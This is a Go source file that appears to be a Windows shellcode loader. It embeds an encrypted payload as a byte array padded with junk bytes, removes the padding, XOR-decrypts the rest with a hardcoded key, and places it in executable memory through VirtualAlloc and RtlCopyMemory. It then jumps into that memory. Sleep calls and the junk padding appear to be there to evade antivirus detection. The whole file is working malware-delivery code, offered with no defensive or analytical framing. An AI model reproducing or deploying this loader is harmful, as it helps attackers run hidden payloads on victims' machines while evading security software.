package main

import (
	"fmt"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。

)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

func main() {
	mix_shellcode := []byte{0x85, 0x79, 0x2a, 0x62, 0xe7, 0x64, 0x90, 0x74, 0x9b, 0x6b, 0x8d, 0x65, 0xb1, 0x79, 0x69, 0x69, 0x65, 0x65, 0x71, 0x71, 0x38, 0x79, 0x28, 0x79, 0x22, 0x63, 0x34, 0x64, 0x20, 0x72, 0x28, 0x79, 0x34, 0x62, 0x2c, 0x64, 0x45, 0x74, 0xb9, 0x6b, 0x0, 0x65, 0x31, 0x79, 0xe2, 0x69, 0x37, 0x65, 0x11, 0x71, 0x31, 0x79, 0xf2, 0x79, 0x31, 0x63, 0x7c, 0x64, 0x3a, 0x72, 0xf2, 0x79, 0x30, 0x62, 0x44, 0x64, 0x3c, 0x74, 0xe0, 0x6b, 0x17, 0x65, 0x29, 0x79, 0x21, 0x69, 0x6a, 0x65, 0xc6, 0x71, 0x33, 0x79, 0x33, 0x79, 0x2e, 0x63, 0x55, 0x64, 0xbb, 0x72, 0x31, 0x79, 0x53, 0x62, 0xa4, 0x64, 0xd8, 0x74, 0x57, 0x6b, 0x4, 0x65, 0x5, 0x79, 0x6b, 0x69, 0x49, 0x65, 0x51, 0x71, 0x38, 0x79, 0xb8, 0x79, 0xaa, 0x63, 0x69, 0x64, 0x33, 0x72, 0x78, 0x79, 0xa3, 0x62, 0x86, 0x64, 0x99, 0x74, 0x39, 0x6b, 0x24, 0x65, 0x28, 0x79, 0x21, 0x69, 0xee, 0x65, 0x23, 0x71, 0x59, 0x79, 0xf2, 0x79, 0x21, 0x63, 0x58, 0x64, 0x3a, 0x72, 0x78, 0x79, 0xb2, 0x62, 0x2, 0x64, 0xf5, 0x74, 0x13, 0x6b, 0x7d, 0x65, 0x72, 0x79, 0x6b, 0x69, 0x10, 0x65, 0x3, 0x71, 0xf2, 0x79, 0xf9, 0x79, 0xeb, 0x63, 0x64, 0x64, 0x72, 0x72, 0x79, 0x79, 0x2a, 0x62, 0xe1, 0x64, 0xb4, 0x74, 0x1f, 0x6b, 0x2, 0x65, 0x31, 0x79, 0x68, 0x69, 0xb5, 0x65, 0x21, 0x71, 0xf2, 0x79, 0x31, 0x79, 0x7b, 0x63, 0x20, 0x64, 0xf9, 0x72, 0x39, 0x79, 0x42, 0x62, 0x2d, 0x64, 0x75, 0x74, 0xbb, 0x6b, 0x86, 0x65, 0x2f, 0x79, 0x21, 0x69, 0x9a, 0x65, 0xb8, 0x71, 0x38, 0x79, 0xf2, 0x79, 0x57, 0x63, 0xec, 0x64, 0x3a, 0x72, 0x78, 0x79, 0xb4, 0x62, 0x29, 0x64, 0x45, 0x74, 0xa2, 0x6b, 0x2d, 0x65, 0x48, 0x79, 0xa9, 0x69, 0xc9, 0x65, 0x30, 0x71, 0xb8, 0x79, 0xb0, 0x79, 0x6e, 0x63, 0x25, 0x64, 0x73, 0x72, 0xb8, 0x79, 0x5a, 0x62, 0x84, 0x64, 0x1, 0x74, 0x9a, 0x6b, 0x29, 0x65, 0x7a, 0x79, 0x25, 0x69, 0x41, 0x65, 0x79, 0x71, 0x3c, 0x79, 0x40, 0x79, 0xb2, 0x63, 0x11, 0x64, 0xaa, 0x72, 0x21, 0x79, 0x26, 0x62, 0xef, 0x64, 0x34, 0x74, 0x4f, 0x6b, 0x2c, 0x65, 0x78, 0x79, 0xb9, 0x69, 0x3, 0x65, 0x30, 0x71, 0xf2, 0x79, 0x75, 0x79, 0x2b, 0x63, 0x20, 0x64, 0xf9, 0x72, 0x39, 0x79, 0x7e, 0x62, 0x2d, 0x64, 0x75, 0x74, 0xbb, 0x6b, 0x24, 0x65, 0xf2, 0x79, 0x6d, 0x69, 0xed, 0x65, 0x39, 0x71, 0x78, 0x79, 0xa9, 0x79, 0x22, 0x63, 0x3c, 0x64, 0x33, 0x72, 0x21, 0x79, 0x3c, 0x62, 0x3d, 0x64, 0x2e, 0x74, 0x2a, 0x6b, 0x3d, 0x65, 0x38, 0x79, 0x30, 0x69, 0x24, 0x65, 0x2b, 0x71, 0x31, 0x79, 0xfa, 0x79, 0x8f, 0x63, 0x44, 0x64, 0x33, 0x72, 0x2b, 0x79, 0x9d, 0x62, 0x84, 0x64, 0x2c, 0x74, 0x2a, 0x6b, 0x3c, 0x65, 0x23, 0x79, 0x21, 0x69, 0xee, 0x65, 0x63, 0x71, 0x90, 0x79, 0x36, 0x79, 0x9c, 0x63, 0x9b, 0x64, 0x8d, 0x72, 0x24, 0x79, 0x8, 0x62, 0x64, 0x64, 0x3d, 0x74, 0xd5, 0x6b, 0x12, 0x65, 0x10, 0x79, 0x7, 0x69, 0xc, 0x65, 0x1f, 0x71, 0x1c, 0x79, 0xd, 0x79, 0x63, 0x63, 0x25, 0x64, 0x24, 0x72, 0x30, 0x79, 0xeb, 0x62, 0x82, 0x64, 0x38, 0x74, 0xe2, 0x6b, 0x94, 0x65, 0x38, 0x79, 0xd3, 0x69, 0x29, 0x65, 0x6, 0x71, 0x5f, 0x79, 0x7e, 0x79, 0x9c, 0x63, 0xb1, 0x64, 0x3a, 0x72, 0x48, 0x79, 0xab, 0x62, 0x2c, 0x64, 0x45, 0x74, 0xb9, 0x6b, 0x28, 0x65, 0x48, 0x79, 0xa9, 0x69, 0x28, 0x65, 0x40, 0x71, 0xb0, 0x79, 0x38, 0x79, 0x33, 0x63, 0x25, 0x64, 0x22, 0x72, 0x38, 0x79, 0xd8, 0x62, 0x5e, 0x64, 0x22, 0x74, 0x12, 0x6b, 0xc2, 0x65, 0x86, 0x79, 0xbc, 0x69, 0x8c, 0x65, 0xe2, 0x71, 0x79, 0x79, 0x79, 0x79, 0x63, 0x63, 0x3e, 0x64, 0x3a, 0x72, 0xf0, 0x79, 0xa3, 0x62, 0x25, 0x64, 0xcc, 0x74, 0xd7, 0x6b, 0x64, 0x65, 0x79, 0x79, 0x69, 0x69, 0x28, 0x65, 0x40, 0x71, 0xb0, 0x79, 0x38, 0x79, 0x32, 0x63, 0x25, 0x64, 0x23, 0x72, 0x13, 0x79, 0x61, 0x62, 0x25, 0x64, 0x25, 0x74, 0x2a, 0x6b, 0xdf, 0x65, 0x2e, 0x79, 0xe0, 0x69, 0xfa, 0x65, 0xb7, 0x71, 0x86, 0x79, 0xac, 0x79, 0x88, 0x63, 0x1d, 0x64, 0x29, 0x72, 0x31, 0x79, 0xeb, 0x62, 0xa5, 0x64, 0x3c, 0x74, 0x5a, 0x6b, 0xb7, 0x65, 0x30, 0x79, 0xe0, 0x69, 0xbd, 0x65, 0x3c, 0x71, 0x48, 0x79, 0xb0, 0x79, 0x31, 0x63, 0xc, 0x64, 0x72, 0x72, 0x4b, 0x79, 0xa2, 0x62, 0xe0, 0x64, 0x26, 0x74, 0x39, 0x6b, 0x24, 0x65, 0xc3, 0x79, 0x82, 0x69, 0x30, 0x65, 0x5f, 0x71, 0x42, 0x79, 0x86, 0x79, 0xb6, 0x63, 0x2c, 0x64, 0xfb, 0x72, 0xbf, 0x79, 0x2a, 0x62, 0xe7, 0x64, 0xb7, 0x74, 0x3b, 0x6b, 0xf, 0x65, 0x73, 0x79, 0x36, 0x69, 0x2d, 0x65, 0xf8, 0x71, 0x88, 0x79, 0xc3, 0x79, 0x7c, 0x63, 0x64, 0x64, 0x72, 0x72, 0x79, 0x79, 0x8, 0x62, 0x64, 0x64, 0x1c, 0x74, 0xeb, 0x6b, 0x56, 0x65, 0x79, 0x79, 0x69, 0x69, 0x2c, 0x65, 0xf8, 0x71, 0x99, 0x79, 0x38, 0x79, 0xda, 0x63, 0x60, 0x64, 0x72, 0x72, 0x79, 0x79, 0x62, 0x62, 0x25, 0x64, 0xce, 0x74, 0x1e, 0x6b, 0x23, 0x65, 0xe7, 0x79, 0xef, 0x69, 0x9a, 0x65, 0xa4, 0x71, 0x31, 0x79, 0xf0, 0x79, 0x92, 0x63, 0x2c, 0x64, 0xfb, 0x72, 0xa3, 0x79, 0x2b, 0x62, 0xa3, 0x64, 0xb4, 0x74, 0x94, 0x6b, 0x9a, 0x65, 0x86, 0x79, 0x96, 0x69, 0x28, 0x65, 0x40, 0x71, 0xb0, 0x79, 0x2b, 0x79, 0x31, 0x63, 0x25, 0x64, 0xc8, 0x72, 0x54, 0x79, 0x64, 0x62, 0x7c, 0x64, 0xf, 0x74, 0x94, 0x6b, 0xb0, 0x65, 0xfc, 0x79, 0xa9, 0x69, 0x6a, 0x65, 0xf4, 0x71, 0xe4, 0x79, 0x78, 0x79, 0x63, 0x63, 0x64, 0x64, 0x3a, 0x72, 0x86, 0x79, 0xad, 0x62, 0x6b, 0x64, 0xf0, 0x74, 0xe7, 0x6b, 0x64, 0x65, 0x79, 0x79, 0x69, 0x69, 0x8e, 0x65, 0xc2, 0x71, 0x90, 0x79, 0x9d, 0x79, 0x62, 0x63, 0x64, 0x64, 0x72, 0x72, 0x91, 0x79, 0xe0, 0x62, 0x9b, 0x64, 0x8b, 0x74, 0x94, 0x6b, 0x4a, 0x65, 0x36, 0x79, 0x1a, 0x69, 0x22, 0x65, 0x25, 0x71, 0x79, 0x79, 0x6e, 0x79, 0x5a, 0x63, 0x9a, 0x64, 0x95, 0x72, 0xf5, 0x79, 0x45, 0x62, 0x6a, 0x64, 0x11, 0x74, 0xdc, 0x6b, 0x1f, 0x65, 0xc8, 0x79, 0x37, 0x69, 0x25, 0x65, 0xdc, 0x71, 0xfb, 0x79, 0xb0, 0x79, 0x28, 0x63, 0x73, 0x64, 0x28, 0x72, 0x7a, 0x79, 0x8, 0x62, 0x47, 0x64, 0xc3, 0x74, 0xf, 0x6b, 0xed, 0x65, 0x19, 0x79, 0x99, 0x69, 0xfc, 0x65, 0x42, 0x71, 0x2f, 0x79, 0x90, 0x79, 0xe8, 0x63, 0xe5, 0x64, 0xe0, 0x72, 0x35, 0x79, 0xc9, 0x62, 0x6, 0x64, 0x56, 0x74, 0xcc, 0x6b, 0xa1, 0x65, 0xf2, 0x79, 0xa2, 0x69, 0x75, 0x65, 0x7d, 0x71, 0x2b, 0x79, 0x6c, 0x79, 0x5e, 0x63, 0x61, 0x64, 0x5, 0x72, 0x16, 0x79, 0x18, 0x62, 0xa, 0x64, 0x4c, 0x74, 0xe, 0x6b, 0xa5, 0x65, 0xe9, 0x79, 0x82, 0x69, 0xdb, 0x65, 0x7, 0x71, 0x65, 0x79, 0xb2, 0x79, 0x6c, 0x63, 0x51, 0x64, 0x48, 0x72, 0x30, 0x79, 0xea, 0x62, 0xd, 0x64, 0x67, 0x74, 0x66, 0x6b, 0xe5, 0x65, 0xb9, 0x79, 0xe3, 0x69, 0x51, 0x65, 0x71, 0x71, 0x2c, 0x79, 0xa, 0x79, 0x6, 0x63, 0x16, 0x64, 0x5f, 0x72, 0x38, 0x79, 0x5, 0x62, 0x1, 0x64, 0x1a, 0x74, 0x1f, 0x6b, 0x5f, 0x65, 0x59, 0x79, 0x24, 0x69, 0xa, 0x65, 0xb, 0x71, 0x10, 0x79, 0x15, 0x79, 0xf, 0x63, 0x5, 0x64, 0x5d, 0x72, 0x4c, 0x79, 0x4c, 0x62, 0x54, 0x64, 0x54, 0x74, 0x43, 0x6b, 0x6, 0x65, 0x16, 0x79, 0x4, 0x69, 0x15, 0x65, 0x10, 0x71, 0xd, 0x79, 0x10, 0x79, 0x1, 0x63, 0x8, 0x64, 0x17, 0x72, 0x42, 0x79, 0x42, 0x62, 0x29, 0x64, 0x27, 0x74, 0x22, 0x6b, 0x20, 0x65, 0x59, 0x79, 0x50, 0x69, 0x4b, 0x65, 0x41, 0x71, 0x42, 0x79, 0x59, 0x79, 0x34, 0x63, 0xd, 0x64, 0x1c, 0x72, 0x1d, 0x79, 0xd, 0x62, 0x13, 0x64, 0x7, 0x74, 0x4b, 0x6b, 0x2b, 0x65, 0x2d, 0x79, 0x49, 0x69, 0x53, 0x65, 0x5f, 0x71, 0x48, 0x79, 0x42, 0x79, 0x43, 0x63, 0x33, 0x64, 0x3d, 0x72, 0x2e, 0x79, 0x54, 0x62, 0x50, 0x64, 0x4f, 0x74, 0x4b, 0x6b, 0x31, 0x65, 0xb, 0x79, 0x0, 0x69, 0x1, 0x65, 0x14, 0x71, 0x17, 0x79, 0xd, 0x79, 0x4c, 0x63, 0x51, 0x64, 0x5c, 0x72, 0x49, 0x79, 0x59, 0x62, 0x44, 0x64, 0x36, 0x74, 0x24, 0x6b, 0x2c, 0x65, 0x3c, 0x79, 0x50, 0x69, 0x5e, 0x65, 0x34, 0x71, 0x37, 0x79, 0x2c, 0x79, 0x30, 0x63, 0x4d, 0x64, 0x7f, 0x72, 0x73, 0x79, 0x62, 0x62, 0x68, 0x64, 0x28, 0x74, 0xc0, 0x6b, 0x6d, 0x65, 0x9e, 0x79, 0x92, 0x69, 0x74, 0x65, 0x1a, 0x71, 0xca, 0x79, 0xbd, 0x79, 0xf3, 0x63, 0xa0, 0x64, 0xd3, 0x72, 0xe3, 0x79, 0xe6, 0x62, 0xd3, 0x64, 0x18, 0x74, 0x98, 0x6b, 0x64, 0x65, 0x8, 0x79, 0x4f, 0x69, 0x3c, 0x65, 0x62, 0x71, 0x87, 0x79, 0x5e, 0x79, 0xff, 0x63, 0x0, 0x64, 0xc3, 0x72, 0x18, 0x79, 0x24, 0x62, 0x4c, 0x64, 0xd, 0x74, 0xf3, 0x6b, 0x13, 0x65, 0xa9, 0x79, 0xd9, 0x69, 0xea, 0x65, 0x37, 0x71, 0x2d, 0x79, 0x1e, 0x79, 0x20, 0x63, 0x61, 0x64, 0xb9, 0x72, 0xc5, 0x79, 0xde, 0x62, 0xd, 0x64, 0xbc, 0x74, 0xa9, 0x6b, 0x38, 0x65, 0x39, 0x79, 0x81, 0x69, 0xb, 0x65, 0x8, 0x71, 0x20, 0x79, 0x72, 0x79, 0x37, 0x63, 0x2f, 0x64, 0xb3, 0x72, 0x39, 0x79, 0x14, 0x62, 0x69, 0x64, 0xef, 0x74, 0xe3, 0x6b, 0x93, 0x65, 0x2a, 0x79, 0xa1, 0x69, 0x3b, 0x65, 0xdd, 0x71, 0x4e, 0x79, 0xe7, 0x79, 0x2c, 0x63, 0x68, 0x64, 0xc0, 0x72, 0x3f, 0x79, 0x44, 0x62, 0xfd, 0x64, 0xd7, 0x74, 0x73, 0x6b, 0xb5, 0x65, 0x9a, 0x79, 0x90, 0x69, 0xb3, 0x65, 0x6d, 0x71, 0x89, 0x79, 0xe, 0x79, 0x35, 0x63, 0xdd, 0x64, 0xc9, 0x72, 0xe4, 0x79, 0xf4, 0x62, 0x1, 0x64, 0x1, 0x74, 0x4b, 0x6b, 0x8d, 0x65, 0x90, 0x79, 0xeb, 0x69, 0x42, 0x65, 0xa7, 0x71, 0x58, 0x79, 0x57, 0x79, 0x77, 0x63, 0x61, 0x64, 0x75, 0x72, 0x2f, 0x79, 0xcd, 0x62, 0x2b, 0x64, 0x87, 0x74, 0xf6, 0x6b, 0x2, 0x65, 0x15, 0x79, 0xc1, 0x69, 0x3e, 0x65, 0xcd, 0x71, 0x52, 0x79, 0x7c, 0x79, 0x1c, 0x63, 0x69, 0x64, 0x5b, 0x72, 0xc, 0x79, 0xdf, 0x62, 0x4a, 0x64, 0x4b, 0x74, 0x70, 0x6b, 0x1f, 0x65, 0xc0, 0x79, 0xc7, 0x69, 0xb, 0x65, 0x71, 0x71, 0x87, 0x79, 0xfe, 0x79, 0x8d, 0x63, 0xc, 0x64, 0xe2, 0x72, 0xb8, 0x79, 0xb0, 0x62, 0x2b, 0x64, 0xbd, 0x74, 0x57, 0x6b, 0x79, 0x65, 0x74, 0x79, 0x4e, 0x69, 0x55, 0x65, 0x8c, 0x71, 0x50, 0x79, 0x4e, 0x79, 0xb5, 0x63, 0x7, 0x64, 0x2, 0x72, 0x7f, 0x79, 0x44, 0x62, 0x75, 0x64, 0x14, 0x74, 0x89, 0x6b, 0xa6, 0x65, 0xc4, 0x79, 0x57, 0x69, 0xff, 0x65, 0x3e, 0x71, 0x5c, 0x79, 0x59, 0x79, 0x4c, 0x63, 0x70, 0x64, 0x23, 0x72, 0x7f, 0x79, 0xd2, 0x62, 0xf7, 0x64, 0xda, 0x74, 0xd, 0x6b, 0x5, 0x65, 0x2d, 0x79, 0xcc, 0x69, 0x27, 0x65, 0x1a, 0x71, 0xcc, 0x79, 0x91, 0x79, 0x2a, 0x63, 0xf7, 0x64, 0x2c, 0x72, 0x7, 0x79, 0xae, 0x62, 0x5c, 0x64, 0x26, 0x74, 0x63, 0x6b, 0xd6, 0x65, 0x59, 0x79, 0xb0, 0x69, 0x22, 0x65, 0x46, 0x71, 0x7d, 0x79, 0xd7, 0x79, 0xf6, 0x63, 0xc2, 0x64, 0xac, 0x72, 0xbc, 0x79, 0x6f, 0x62, 0xe4, 0x64, 0x22, 0x74, 0x1f, 0x6b, 0xf4, 0x65, 0xc2, 0x79, 0x9, 0x69, 0x35, 0x65, 0xf5, 0x71, 0xbb, 0x79, 0x39, 0x79, 0x79, 0x63, 0x64, 0x64, 0x33, 0x72, 0xc7, 0x79, 0x92, 0x62, 0xd1, 0x64, 0xd6, 0x74, 0x3d, 0x6b, 0x9a, 0x65, 0xac, 0x79, 0x21, 0x69, 0x54, 0x65, 0xb8, 0x71, 0xc3, 0x79, 0x79, 0x79, 0x63, 0x63, 0x24, 0x64, 0x72, 0x72, 0x38, 0x79, 0xda, 0x62, 0x64, 0x64, 0x64, 0x74, 0x6b, 0x6b, 0x65, 0x65, 0x38, 0x79, 0xd0, 0x69, 0x25, 0x65, 0x71, 0x71, 0x79, 0x79, 0x79, 0x79, 0x22, 0x63, 0xde, 0x64, 0x2a, 0x72, 0xdd, 0x79, 0x31, 0x62, 0x81, 0x64, 0x8b, 0x74, 0xbe, 0x6b, 0x2d, 0x65, 0xea, 0x79, 0x3a, 0x69, 0x36, 0x65, 0x39, 0x71, 0xf0, 0x79, 0x9e, 0x79, 0x2b, 0x63, 0xed, 0x64, 0x83, 0x72, 0x31, 0x79, 0xeb, 0x62, 0xbe, 0x64, 0x35, 0x74, 0xd3, 0x6b, 0x65, 0x65, 0x59, 0x79, 0x69, 0x69, 0x65, 0x65, 0x38, 0x71, 0xf0, 0x79, 0x80, 0x79, 0x22, 0x63, 0xde, 0x64, 0x60, 0x72, 0xef, 0x79, 0xeb, 0x62, 0x86, 0x64, 0x8b, 0x74, 0xbe, 0x6b, 0x2d, 0x65, 0xfa, 0x79, 0xad, 0x69, 0x45, 0x65, 0xf4, 0x71, 0xb9, 0x79, 0xd, 0x79, 0xd5, 0x63, 0x2, 0x64, 0xf9, 0x72, 0x7e, 0x79, 0x2a, 0x62, 0x65, 0x64, 0xb7, 0x74, 0xee, 0x6b, 0xa5, 0x65, 0xc, 0x79, 0xbe, 0x69, 0x3d, 0x65, 0x29, 0x71, 0x21, 0x79, 0x31, 0x79, 0x66, 0x63, 0x64, 0x64, 0x72, 0x72, 0x79, 0x79, 0x62, 0x62, 0x34, 0x64, 0xb7, 0x74, 0x83, 0x6b, 0x1a, 0x65, 0x84, 0x79, 0x96, 0x69, 0x9a, 0x65, 0x40, 0x71, 0x4b, 0x79, 0x48, 0x79, 0x4d, 0x63, 0x50, 0x64, 0x5c, 0x72, 0x40, 0x79, 0x50, 0x62, 0x4a, 0x64, 0x42, 0x74, 0x5d, 0x6b, 0x65, 0x65, 0x28, 0x79, 0x60, 0x69, 0xda, 0x65, 0x1c, 0x71}
	var ttyolller []byte
	key := []byte("ybdtkeyieqyycdr")
	var key_size = len(key)
	var shellcode_final []byte
	var j = 0
	time.Sleep(2)
	// 去除垃圾代码
	fmt.Print(len(mix_shellcode))
	for i := 0; i < len(mix_shellcode); i++ {
		if i%2 == 0 {
			shellcode_final = append(shellcode_final, mix_shellcode[i])
			j += 1
		}
	}

	time.Sleep(3)
	fmt.Print(shellcode_final)
	// 解密异或
	for i := 0; i < len(shellcode_final); i++ {
		ttyolller = append(ttyolller, shellcode_final[i]^key[i%key_size])
	}

	time.Sleep(3)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	time.Sleep(3)
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&ttyolller[0])), uintptr(len(ttyolller)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
